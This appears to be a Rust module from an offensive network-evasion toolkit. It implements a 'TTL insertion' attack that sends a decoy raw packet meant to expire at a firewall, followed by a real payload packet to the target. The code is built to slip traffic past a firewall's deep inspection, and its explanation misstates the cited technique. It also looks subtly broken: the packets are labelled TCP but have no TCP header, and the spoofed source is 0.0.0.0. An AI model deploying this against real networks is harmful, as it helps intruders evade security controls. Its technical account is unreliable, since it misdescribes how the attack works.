use crate::core::net_evasion::packet_forge::IpBuilder;
use crate::core::net_evasion::raw_socket::RawChannel;
use anyhow::{Context, Result};
use std::net::SocketAddrV4;

/// TTL Insertion engine per Ptacek & Newsham §3.2.
///
/// This is a **state-table poisoning** technique, NOT fragmentation.
/// It exploits the TTL field to make packets die AT the firewall while
/// the firewall still records partial flow state.
///
/// Architecture:
/// 1. Send DECOY datagram with TTL calibrated to `fw_hop_count` (dies AT firewall).
///    The firewall records flow state from the DECOY but the packet never reaches the host.
/// 2. Send REAL datagram with normal TTL (reaches host).
///    The firewall believes it has already processed this flow → bypasses deep inspection.
///
/// DECOY and REAL are independent datagrams with **different ip_id** values.
pub struct TtlInserter {
    channel: RawChannel,
}

impl TtlInserter {
    pub fn new(channel: RawChannel) -> Self {
        Self { channel }
    }

    /// Performs a calibrated TTL bypass against `target`.
    ///
    /// `fw_hop_count`: Number of routing hops to the firewall (measured via traceroute/TTL probe).
    ///                 DECOY TTL = fw_hop_count (packet expires at firewall).
    /// `payload`: The L4 payload to deliver.
    pub async fn ttl_bypass(
        &self,
        target: SocketAddrV4,
        payload: &[u8],
        fw_hop_count: u8,
    ) -> Result<()> {
        let dst_ip = *target.ip();
        let src_ip = Self::pick_source_ip()?;

        // --- Step 1: DECOY ---
        // TTL = fw_hop_count → dies exactly at the firewall.
        let decoy_ip = IpBuilder::new(src_ip, dst_ip, 6) // 6 = TCP
            .with_ttl(fw_hop_count)
            .with_payload_len(payload.len() as u16);
        let mut decoy_packet = decoy_ip.build();
        decoy_packet.extend_from_slice(payload);

        self.channel.send_batch(&[decoy_packet]).await
            .context("send_batch failed for DECOY packet")?;

        // Brief delay to ensure firewall processes DECOY state.
        tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;

        // --- Step 2: REAL ---
        // Normal TTL (64) → reaches the target host.
        let real_ip = IpBuilder::new(src_ip, dst_ip, 6)
            .with_ttl(64)
            .with_payload_len(payload.len() as u16);
        let mut real_packet = real_ip.build();
        real_packet.extend_from_slice(payload);

        self.channel.send_batch(&[real_packet]).await
            .context("send_batch failed for REAL packet")?;

        Ok(())
    }

    /// Picks a source IP for the forged packets.
    /// For now, uses 0.0.0.0; caller may override via interface selection.
    fn pick_source_ip() -> Result<std::net::Ipv4Addr> {
        // TODO: Interface IP enumeration for realistic spoofing.
        Ok(std::net::Ipv4Addr::new(0, 0, 0, 0))
    }
}
